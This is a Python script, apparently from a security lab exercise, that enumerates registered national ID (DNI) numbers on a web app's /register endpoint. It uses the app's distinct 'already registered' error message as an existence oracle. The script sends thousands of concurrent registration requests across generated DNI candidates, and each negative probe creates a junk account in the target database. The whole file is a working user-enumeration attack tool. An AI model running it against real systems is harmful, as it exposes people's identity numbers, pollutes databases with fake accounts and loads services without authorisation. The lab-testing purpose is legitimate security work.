#!/usr/bin/env python3
"""
Lab 242 WorkConnect - existence-oracle sweep over the /register DNI field.

The oracle is the one at main.py:70-73: a DISTINCT error string is rendered when the
submitted DNI already exists. This harness never trusts that string until the positive
control has fired (see --positive-control), and it never reports a negative without a
work count.

Every negative probe INSERTS a row (main.py:77) - the response size delta is the proof
that the probe was really executed and not short-circuited.
"""
import argparse
import string
import sys
import time
import concurrent.futures
import http.client

PRESENT = "ya se encuentra registrado"
ABSENT = "Registro completado"
LETTERS = string.ascii_uppercase


class Probe:
    def __init__(self, host, port, path="/register"):
        self.host, self.port, self.path = host, port, path

    def post(self, dni, email_tag):
        body = (
            "name=Probe&email=dni_%s@probe.invalid&dni=%s&password=Probe12345"
            % (email_tag, dni)
        )
        c = http.client.HTTPConnection(self.host, self.port, timeout=10)
        try:
            c.request(
                "POST",
                self.path,
                body,
                {"Content-Type": "application/x-www-form-urlencoded",
                 "Content-Length": str(len(body))},
            )
            r = c.getresponse()
            data = r.read().decode("utf-8", "replace")
            return r.status, len(data), (PRESENT in data), (ABSENT in data)
        finally:
            c.close()


def verdict(p):
    st, n, present, absent = p
    if present and not absent:
        return "PRESENT"
    if absent and not present:
        return "ABSENT"
    return "INDETERMINATE"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--workers", type=int, default=20)
    ap.add_argument("--lo", type=int, default=0)
    ap.add_argument("--hi", type=int, default=1000)
    ap.add_argument("--letters", default=LETTERS)
    ap.add_argument("--positive-control", default="71902345A")
    ap.add_argument("--negative-control", default="99999999X")
    ap.add_argument("--out", default="-")
    a = ap.parse_args()

    pr = Probe(a.host, a.port)
    log = None if a.out == "-" else open(a.out, "w")

    def emit(s):
        print(s)
        if log is not None:
            log.write(s + "\n")
            log.flush()

    # ---------------------------------------------------------------- controls
    # Control pair FIRST. A detector that has not seen a success is not a detector.
    st, n, pres, abs_ = pr.post(a.positive_control, "posctrl")
    v = verdict((st, n, pres, abs_))
    emit("# POSITIVE CONTROL  dni=%s -> %s  http=%d bytes=%d present_marker=%s absent_marker=%s"
         % (a.positive_control, v, st, n, pres, abs_))
    if v != "PRESENT":
        emit("# ORACLE DID NOT FIRE - every negative below would be untrusted. STOPPING.")
        sys.exit(2)
    st, n, pres, abs_ = pr.post(a.negative_control, "negctrl")
    v = verdict((st, n, pres, abs_))
    emit("# NEGATIVE CONTROL  dni=%s -> %s  http=%d bytes=%d present_marker=%s absent_marker=%s"
         % (a.negative_control, v, st, n, pres, abs_))
    if v != "ABSENT":
        emit("# NEGATIVE CONTROL DID NOT BE ABSENT - the control cannot exist but answered %s. STOPPING." % v)
        sys.exit(2)
    emit("# oracle green in both directions; control byte sizes recorded above")

    # ------------------------------------------------------------------- sweep
    jobs = []
    for i in range(a.lo, a.hi):
        for L in a.letters:
            jobs.append("%s%03d%s" % (a.positive_control[:5], i, L))

    start = time.time()
    counts = {"PRESENT": 0, "ABSENT": 0, "INDETERMINATE": 0}
    indeterminate = []
    hits = []
    byte_sizes = {}
    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.workers) as ex:
        for dni, p in ex.map(lambda d: (d, pr.post(d, d[-1:])), jobs):
            v = verdict(p)
            byte_sizes.setdefault(v, set()).add(p[1])
            counts[v] += 1
            done += 1
            if v == "PRESENT":
                hits.append(dni)
                emit("HIT %s  http=%d bytes=%d" % (dni, p[0], p[1]))
            elif v == "INDETERMINATE":
                indeterminate.append((dni, p))
            if done % 2000 == 0:
                el = time.time() - start
                emit("# progress %d/%d  %.1f req/s  present=%d"
                     % (done, len(jobs), done / el, counts["PRESENT"]))
    el = time.time() - start

    emit("")
    emit("# ------------------------------------------------------------------")
    emit("# WORK COUNT: candidates submitted = %d  (numbers %03d-%03d x %d letters)"
         % (len(jobs), a.lo, a.hi, len(a.letters)))
    emit("# WORK COUNT: requests actually completed = %d" % (len(jobs) - len(indeterminate)))
    emit("# WORK COUNT: elapsed %.1f s  rate %.1f req/s" % (el, len(jobs) / el))
    emit("# VERDICTS: PRESENT=%d  ABSENT=%d  INDETERMINATE=%d"
         % (counts["PRESENT"], counts["ABSENT"], counts["INDETERMINATE"]))
    emit("# RESPONSE SIZES: " + "  ".join(
        "%s -> %s" % (k, sorted(v)) for k, v in sorted(byte_sizes.items())))
    emit("# FOUND: %d  -> %s" % (len(hits), ", ".join(hits)))
    for dni, p in indeterminate:
        emit("# INDETERMINATE dni=%s http=%d bytes=%d present=%s absent=%s" % (dni, p[0], p[1], p[2], p[3]))
    if log is not None:
        log.close()


if __name__ == "__main__":
    main()
